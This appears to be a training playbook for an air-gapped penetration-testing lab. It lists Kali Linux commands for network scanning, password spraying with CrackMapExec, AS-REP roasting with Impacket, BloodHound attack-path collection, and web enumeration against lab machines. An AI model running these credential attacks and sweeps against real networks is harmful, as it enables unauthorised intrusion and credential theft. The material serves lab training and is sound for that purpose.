# Weaponized Kali Linux Tool Playbook

This multi-target range provides an air-gapped environment to practice the execution of core offensive utilities pre-packaged inside the Kali Linux operating system.

---

## 🛰️ Phase 1: Network Reconnaissance & Service Sweeping
To cleanly identify active targets across the private internal sandbox switch network segment (`LabNet`), map out service headers using **Nmap**:

```bash
# Aggressive service version scanning and script enumeration against the domain controller
nmap -sV -sC -p- -T4 10.0.2.8 -oN ~/Labs/trapped.local/scans/dc_nmap.txt
```

---

## 🌲 Phase 2: High-Density Active Directory Exploitation

### 1. Target Account Password Spraying
Leverage **NetExec** or **CrackMapExec** to safely check for default or weak credentials across the fuzzed **2,491 user database** without triggering lockouts:
```bash
crackmapexec smb 10.0.2.8 -u ~/Labs/trapped.local/loot/user_dictionary.txt -p 'Winter2026!' --continue-on-success
```

### 2. AS-REP Roasting (No-Preauth Accounts)
Hunt for user profiles that do not require Kerberos pre-authentication to dump crackable ticket hashes using **Impacket**:
```bash
impacket-GetNPUsers trapped.local/ -usersfile ~/Labs/trapped.local/loot/user_dictionary.txt -format hashcat -outputfile ~/Labs/trapped.local/loot/asrep_hashes.txt
```

### 3. Attack Path Graphing (BloodHound)
Ingest the directory boundaries, groups, and permissions to visually trace a path to Domain Admin:
```bash
# Gather Active Directory metrics into json loops
bloodhound-python -d trapped.local -dc 10.0.2.8 -c All -u compromised_user -p cracked_password
```

---

## 🌐 Phase 3: Web Application Penetration Testing
Target the pre-installed web application nodes to train in directory discovery, vulnerability scanning, and local privilege escalation:

```bash
# Enumerate hidden assets on the DC-1 Drupal Node
gobuster dir -u http://10.0.2.5 -w /usr/share/wordlists/dirb/common.txt

# Audit legacy software vulnerabilities on the Kioptrix Server
nikto -h http://10.0.2.12
```